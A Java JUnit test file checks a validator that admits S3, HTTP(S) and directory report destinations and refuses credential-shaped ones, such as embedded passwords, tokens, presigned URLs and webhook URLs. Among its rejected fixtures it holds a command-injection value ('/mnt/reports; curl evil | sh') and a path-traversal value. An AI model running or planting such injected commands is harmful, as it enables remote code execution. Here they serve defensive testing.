package telamin.fluxtion.audit.analyser.analyser.config;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;

import static org.junit.jupiter.api.Assertions.*;

/**
 * M38.5 (spec-portable-context D-C6) — a report destination is a PLACE, never a credential. The gate admits
 * s3://bucket[/prefix], a plain http(s) base URL and a directory path, and refuses — with the reason —
 * anything shaped like a secret. The category travels by default with a label that names the cargo.
 */
class ReportDestinationTest {

    @Test
    void placesAreAccepted_andTheirKindIsRead() {
        assertTrue(ReportDestination.refuse(new ReportDestination("bucket", "s3://acme-incident-reports/quotes/")).isEmpty());
        assertEquals(ReportDestination.Kind.S3, new ReportDestination("b", "s3://acme-incident-reports").kind());
        assertTrue(ReportDestination.refuse(new ReportDestination("tickets", "https://tickets.example.invalid/browse/OPS")).isEmpty());
        assertEquals(ReportDestination.Kind.URL, new ReportDestination("t", "https://tickets.example.invalid/browse").kind());
        assertTrue(ReportDestination.refuse(new ReportDestination("shared", "/mnt/shared/reports/quote-service")).isEmpty());
        assertTrue(ReportDestination.refuse(new ReportDestination("mine", "~/reports")).isEmpty());
        assertTrue(ReportDestination.refuse(new ReportDestination("rel", "reports/incidents")).isEmpty());
        assertEquals(ReportDestination.Kind.DIRECTORY, new ReportDestination("r", "reports").kind());
    }

    @Test
    void anythingShapedLikeACredentialIsRefused_withTheReason() {
        Map<String, String> bad = new LinkedHashMap<>();
        bad.put("https://user:pass@host/reports", "user info");
        bad.put("https://host/reports?token=abc123", "credential");     // the blocklist names it before the query rule
        bad.put("https://host/reports#sig=abc", "credential");
        bad.put("s3://bucket/prefix?X-Amz-Signature=abc", "credential");   // a presigned URL IS a credential; the blocklist names it
        bad.put("/mnt/reports AKIAABCDEFGHIJKLMNOP", "CREDENTIAL");
        bad.put("/mnt/reports; curl evil | sh", "not a plain directory path");
        bad.put("/mnt/../etc", "'..'");
        bad.put("ftp://host/reports", "not a plain directory path");   // no scheme allowlist for ftp → falls to directory rules and fails on ':'
        bad.put("password=hunter2", "CREDENTIAL");
        // review F1: a webhook's secret is its PATH — the shape people will actually paste
        bad.put("https://hooks.slack.com/services/T0000/B0000/XXXXXXXXXXXXXXXX", "webhook");
        bad.put("https://outlook.office.com/webhook/abc-def/IncomingWebhook/dead", "webhook");
        bad.put("https://acme.webhook.office.com/webhookb2/abc/IncomingWebhook/x", "webhook");
        bad.put("https://discord.com/api/webhooks/1234/abcdef", "webhook");
        bad.put("https://hooks.zapier.com/hooks/catch/1/abc/", "webhook");
        bad.forEach((loc, why) -> {
            var r = ReportDestination.refuse(new ReportDestination("d", loc));
            assertTrue(r.isPresent(), "must refuse: " + loc);
            assertTrue(r.get().toLowerCase().contains(why.toLowerCase()), loc + " -> " + r.get());
        });
        assertTrue(ReportDestination.refuse(new ReportDestination("bad name", "s3://b")).get().contains("name"));
        assertTrue(ReportDestination.refuse(new ReportDestination("d", "")).get().contains("no location"));
        assertTrue(ReportDestination.refuse(new ReportDestination("d", "a\nb")).get().contains("one line"));
    }

    @Test
    void theLoaderDropsRefusedOnes_theCategoryTravelsByDefault_andTheProfileRoundTrips(@TempDir Path dir) throws Exception {
        Properties p = new Properties();
        p.setProperty("destination.count", "2");
        p.setProperty("destination.0.name", "bucket");
        p.setProperty("destination.0.location", "s3://acme-incident-reports");
        p.setProperty("destination.1.name", "leaky");
        p.setProperty("destination.1.location", "https://svc:secret@host/reports");
        List<ReportDestination> out = new ArrayList<>();
        var refused = ConfigStore.readDestinations(p, out);
        assertEquals(1, out.size());
        assertEquals(1, refused.size());
        assertTrue(refused.get(0).contains("credential"), refused.get(0));

        assertFalse(SettingsShare.Category.DESTINATIONS.defaultOn, "review F1: a webhook URL cannot be told from a place, so the box is off — the LLM precedent");
        String label = SettingsShare.Category.DESTINATIONS.label.toLowerCase();
        assertTrue(label.contains("webhook") && label.contains("secret") && label.contains("published"), "the label names the risk: " + label);
        assertTrue(ProjectProfile.PROJECT_SCOPED.contains(SettingsShare.Category.DESTINATIONS));

        SettingsShare share = new SettingsShare();
        AppConfig sender = new AppConfig();
        sender.reportDestinations.add(new ReportDestination("bucket", "s3://acme-incident-reports/quotes"));
        String text = share.export(sender, Set.of(SettingsShare.Category.DESTINATIONS), null);
        assertTrue(text.contains("destination.0.name=bucket"), text);   // Properties escapes ':' in the raw text; the location is checked by the round trip below
        assertFalse(share.export(sender, Set.of(SettingsShare.Category.SOURCE_ROOTS), null).contains("destination."));
        AppConfig receiver = new AppConfig();
        var plan = share.preview(text + "destination.count=2\ndestination.1.name=leaky\ndestination.1.location=https://host/x?token=1\n", receiver);
        assertTrue(plan.summary().get(SettingsShare.Category.DESTINATIONS).contains("1 REFUSED"), plan.summary().toString());
        share.apply(plan, Set.of(SettingsShare.Category.DESTINATIONS), receiver);
        assertEquals(List.of("bucket"), receiver.reportDestinations.stream().map(ReportDestination::name).toList());

        Path file = dir.resolve(ProjectProfile.CANONICAL_RELATIVE);
        Files.createDirectories(file.getParent());
        assertTrue(ProjectProfile.save(file, sender, share));
        AppConfig back = new AppConfig();
        assertTrue(ProjectProfile.load(file, back, share).loaded());
        assertEquals(sender.reportDestinations, back.reportDestinations);
        Files.writeString(file, Files.readString(file) + "destination.count=2\ndestination.1.name=leaky\ndestination.1.location=https://u:p@h/r\n");
        assertTrue(ProjectProfile.load(file, back, share).message().contains("⚠ destinations:"));
        ProjectProfile.clearProjectScoped(back);
        assertTrue(back.reportDestinations.isEmpty());
    }
}
